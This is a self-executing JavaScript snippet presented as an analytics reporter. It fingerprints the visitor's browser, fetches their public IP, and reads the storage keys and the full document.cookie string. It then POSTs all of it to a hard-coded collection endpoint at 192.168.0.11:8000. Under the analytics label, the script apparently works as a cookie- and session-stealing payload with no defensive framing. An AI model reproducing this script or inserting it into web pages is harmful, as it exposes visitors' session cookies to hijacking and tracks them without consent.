(async function() {
    async function getClientIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch (e) {
            return null;
        }
    }

    function getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            sessionStorage: Object.keys(sessionStorage),
            localStorage: Object.keys(localStorage),
            cookies: document.cookie
        };
    }

    const analyticsData = {
        timestamp: new Date().toISOString(),
        ip: await getClientIP(),
        page: window.location.pathname,
        referrer: document.referrer,
        ...getDeviceInfo()
    };

    try {
        const response = await fetch('http://192.168.0.11:8000/report', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(analyticsData)
        });
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        console.log('Analytics sent successfully');
        console.log('Response:', await response.json());
    } catch (error) {
        console.error('Failed to send analytics:', error);
    }
})();